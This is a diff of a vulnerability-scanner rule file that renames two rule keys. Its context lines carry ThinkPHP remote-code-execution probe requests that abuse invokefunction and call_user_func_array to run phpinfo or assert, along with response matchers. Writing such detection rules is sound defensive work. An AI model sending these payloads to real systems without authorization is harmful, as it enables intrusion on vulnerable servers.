@@ -31,7 +31,7 @@ rules:
       method: GET
       path: "/?s=api/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
     expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
-  r1111:
+  r111:
     request:
       method: GET
       path: "/?s=api/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
@@ -41,7 +41,7 @@ rules:
       method: GET
       path: "/?s=manage/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
     expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
-  r11111:
+  r1111:
     request:
       method: GET
       path: "/?s=manage/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
